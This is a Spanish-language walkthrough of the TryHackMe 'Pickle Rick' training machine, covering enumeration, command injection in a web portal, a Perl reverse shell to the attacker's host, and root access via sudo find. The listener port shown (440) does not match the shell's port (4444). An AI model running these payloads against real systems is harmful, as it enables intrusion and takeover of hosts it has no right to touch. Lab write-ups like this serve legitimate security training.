# >_ [Pickle Rick]

| Propiedad | Detalle |
| :--- | :--- |
| **Plataforma** | TryHackMe |
| **Dificultad** | 🟢 Fácil  |
| **OS** | Linux  |
| **IP de la Máquina** | `10.128.161.94` |
| **Fecha de resolución** | 2026-10-12 |

---

## 📝 Descripción
Máquina enfocada en la explotación de un servicio web vulnerable y posterior escalada de privilegios mediante abuso de permisos SUDO.

---

## 🔍 1. Fase de Reconocimiento y Enumeración


### Escaneo de Puertos (`nmap`)
Lanzamos un escaneo inicial para identificar los puertos abiertos y los servicios activos en la máquina objetivo:

```bash
 nmap -p- --open -n -Pn 10.128.161.94
```

**Resultados del escaneo:**
* **Puerto 22/TCP**: SSH
* **Puerto 80/TCP**: HTTP (Apache)

<img width="646" height="215" alt="1escaneoinicial" src="https://github.com/user-attachments/assets/72681f08-bbdc-4e47-be3f-f4acc2ec4261" />
<br><br>

### Enumeración de servicios
Continuamos con un escaneo más profundo del servicio encontrado:

```bash
nmap -p 22,80 -sCV -n 10.128.161.94
```

<img width="866" height="374" alt="2escaneopuertos" src="https://github.com/user-attachments/assets/b1d3344c-f1f4-46bf-864d-81eb6f852257" />
<br><br>


### Enumeración Web (Puerto 80)

Al inspeccionar el sitio web, nos encontramos con una página destinada a ayudar a Morty, vamos a mirar el código fuente.
<img width="1092" height="746" alt="3web" src="https://github.com/user-attachments/assets/9df2629f-f566-4189-bc5a-182fb6295750" />
<br><br>

Hay un nombre de usuario en un comentario del código HTML de la web, nos lo guardamos y vamos a continuar con la enumeración usando Gobuster.
<img width="1091" height="725" alt="4" src="https://github.com/user-attachments/assets/99128df5-83ee-46a9-98c5-4031be3f4a73" />
<br><br>

** Username: R1ckRul3s**


Aplicamos fuzzing de directorios para buscar rutas ocultas:
```bash
gobuster dir -u http://10.128.161.94 -w /usr/share/wordlists/rockyou.txt -x php,txt,html -t 100 -k -r
```
<img width="1149" height="571" alt="5enumweb" src="https://github.com/user-attachments/assets/e67acb86-8a85-4b24-8e07-286ff539f8e6" />
<br><br>

Encontramos varias rutas interesantes: login.php, robots.txt y portal.php , así que vamos a mirar qué contienen y si podemos explotarlas.
<br><br>

---

## 💥 2. Fase de Explotación (Acceso Inicial)

Comenzamos entrando a login.php, aquí nos pide un usuario y una contraseña, el usuario lo tenemos porque anteriormente estaba escrito en un comentario de la página web principal, pero la contraseña no, así que vamos a ver otra página de las descubiertas.
<img width="1831" height="825" alt="6" src="https://github.com/user-attachments/assets/cd3b50cd-96e0-4711-b75d-a6b00799e194" />

En robots.txt solo hay una palabra que parece una contraseña, podríamos probarla junto con el usuario que descubrimos en la página de login.
<img width="1124" height="425" alt="7" src="https://github.com/user-attachments/assets/2b5c1a07-3cca-4cdc-ae79-71272861bf98" />
<br><br>


### Vector de Ataque
Escribimos el usuario y la contraseña encontrados y estamos dentro, vemos que es portal.php, una de las rutas que encontramos previamente pero a la que no podíamos acceder antes.
<img width="1682" height="505" alt="8dentro" src="https://github.com/user-attachments/assets/b1369a21-b7a3-41cb-bec4-da1599394d7d" />


Probamos a ejecutar un comando ping y seguido un ls para ver si nos lo ejecuta y nos lo lanza. Ahora podemos ver todo lo que hay en el directorio actual y vemos un archivo txt un poco sospechoso.

```bash
127.0.0.1 ; ls -la
```

<img width="1445" height="533" alt="9ls" src="https://github.com/user-attachments/assets/dbb5659d-48a9-41c8-afdd-1d3300e0e291" />
<br><br>

Nos muestra el ping y debajo nos ha ejecutado el **ls -la** que pusimos, por lo que es vulnerable. 
Hay inyección de comandos, por lo que podemos mirar archivos como el usuario web-admin, ya que haciendo un whoami nos dice que somos ese usuario.


<img width="1665" height="593" alt="10" src="https://github.com/user-attachments/assets/aecc21c9-72bf-4125-a7b8-e18a1f86bfc2" />
<br><br>

Verificamos que esta sea la respuesta a la primera pregunta que nos hicieron y es correcta.
<img width="686" height="272" alt="11ingredientee" src="https://github.com/user-attachments/assets/f33c898b-53a2-4147-b000-6e2617843e58" />
<br><br>

Ahora vamos a mirar un fichero que descubrimos con el ls anterior llamado clue.txt, ya que su nombre es pista.
<img width="1518" height="557" alt="11png" src="https://github.com/user-attachments/assets/1152255a-d1f9-44b6-a6c8-0554309b7b10" />
<br><br>

Nos dice que busquemos por el sistema de archivos el otro ingrediente, así que vamos a listar todo lo que tiene el usuario rick en su carpeta personal
<img width="1507" height="531" alt="13sefundo" src="https://github.com/user-attachments/assets/9cb25288-b407-4771-8fff-e285ee9751e4" />
<br><br>

Hay un fichero llamado second ingredients, leemos su contenido
<img width="1536" height="633" alt="14" src="https://github.com/user-attachments/assets/dfeee5fc-2470-4614-a4c4-fe85fa609fdf" />
<br><br>

Comprobamos si esta es la respuesta al segundo ingrediente que nos piden y es correcta. Vamos a continuar buscando el tercer y último ingrediente. Para ello vamos a escalar privilegios obteniendo una consola más interactiva.
<img width="670" height="369" alt="14siiiii" src="https://github.com/user-attachments/assets/01a6f163-eb53-4e7c-857f-df7fb2c2b732" />
<br><br>


### Intrusión (Reverse Shell)
Logramos ejecutar comandos en el sistema y establecemos una *reverse shell* hacia nuestra máquina atacante:

```perl
# Comando ejecutado en el navegador web
perl -e 'use Socket;$i="10.128.173.235";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
```

<img width="1291" height="814" alt="15" src="https://github.com/user-attachments/assets/06564cc3-1f04-45d9-85dc-02850f416343" />
<br><br>


Ponemos nuestro *netcat* a la escucha para recibir la conexión:

```bash
sudo nc -lvnp 440
```

<img width="1131" height="750" alt="1666" src="https://github.com/user-attachments/assets/5a3c285f-3ba0-4cb0-8a47-89b06596ad04" />
<br><br>

Ya somos el usuario web-admin desde una terminal, ahora procedemos a sanitizarla.

```bash
# Tratamiento de  la TTY para tener una consola interactiva cómoda
script /dev/null -c bash
# Ctrl+Z
stty raw -echo; fg
reset xterm
export TERM=xterm
```

<img width="736" height="296" alt="16sanitizar" src="https://github.com/user-attachments/assets/111fb8a0-ba65-42b4-b43e-67be7fd9339a" />
<br><br>


## 👑 3. Escalada de Privilegios

### Enumeración del Sistema


```bash
# Comprobamos privilegios de SUDO
sudo -l
```

Comenzamos comprobando si tenemos permisos con sudo -l y podemos ejecutar find sin contraseña como el usuario root.

<img width="879" height="414" alt="17" src="https://github.com/user-attachments/assets/5efb0307-a014-4be4-92ff-54914985891c" />
<br><br>


---

### Explotación del Vector de Escalada

Nos aprovechamos del permiso configurado en sudoers que tenemos, para ejecutar find sin contraseña y como el usuario root para convertirnos en él.

```bash
sudo find . -exec /bin/sh \; -quit
```



Conseguimos ser *root* Buscamos la flag en la carpeta personal de root.
<img width="664" height="518" alt="18clave3 - copia" src="https://github.com/user-attachments/assets/de075313-8a68-4268-8fc7-e9f364f7bf76" />
<br><br>

Por último, validamos la flag obtenida.

<img width="1047" height="405" alt="Final" src="https://github.com/user-attachments/assets/b74ba8dc-a92d-4326-a0ae-3c730c214827" />




